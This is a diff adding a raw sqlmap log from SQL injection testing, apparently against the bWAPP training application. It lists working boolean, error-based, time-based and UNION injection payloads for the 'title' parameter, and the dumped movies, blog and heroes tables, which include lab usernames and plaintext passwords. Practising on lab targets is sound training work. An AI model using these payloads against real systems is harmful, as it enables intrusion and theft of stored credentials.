@@ -1,0 +1,272 @@
+sqlmap identified the following injection point(s) with a total of 157 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: title=2345' OR NOT 7507=7507#&action=search
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: title=2345' OR ROW(7687,6422)>(SELECT COUNT(*),CONCAT(0x71706b7871,(SELECT (ELT(7687=7687,1))),0x7171766271,FLOOR(RAND(0)*2))x FROM (SELECT 2459 UNION SELECT 6703 UNION SELECT 6964 UNION SELECT 9592)a GROUP BY x)-- UvRu&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=2345' AND (SELECT 3096 FROM (SELECT(SLEEP(5)))MzPu)-- YtVc&action=search
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: title=2345' UNION ALL SELECT NULL,NULL,CONCAT(0x71706b7871,0x54494873707a6d475253745442457568596e7368686d48674d6b57754d6e514679677a584a6b6c73,0x7171766271),NULL,NULL,NULL,NULL#&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
+sqlmap identified the following injection point(s) with a total of 626 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=8765432' AND (SELECT 2165 FROM (SELECT(SLEEP(5)))cxeV) AND 'bhvj'='bhvj&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+current database: 'bWAPP'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+current database: 'bWAPP'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=8765432' AND (SELECT 2165 FROM (SELECT(SLEEP(5)))cxeV) AND 'bhvj'='bhvj&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=8765432' AND (SELECT 2165 FROM (SELECT(SLEEP(5)))cxeV) AND 'bhvj'='bhvj&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=8765432' AND (SELECT 2165 FROM (SELECT(SLEEP(5)))cxeV) AND 'bhvj'='bhvj&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=12345' OR NOT 7434=7434-- WGqR&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345' AND (SELECT 4132 FROM (SELECT(SLEEP(5)))lzmn)-- DdEn&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
